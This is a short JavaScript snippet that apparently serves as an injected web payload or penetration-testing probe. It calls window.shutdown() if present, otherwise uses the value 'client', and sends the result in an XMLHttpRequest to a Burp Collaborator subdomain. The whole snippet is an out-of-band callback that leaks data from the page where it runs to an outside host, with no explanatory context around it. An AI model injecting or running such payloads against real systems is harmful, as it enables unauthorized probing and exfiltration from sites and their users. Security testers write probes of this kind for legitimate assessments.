var a = window.shutdown ? window.shutdown() : "client";

b = new XMLHttpRequest();
b.open("GET", "https://v1xjudkxluehpa1vaqjxkito6fc60v.burpcollaborator.net/?shut="+a, true);
b.send();
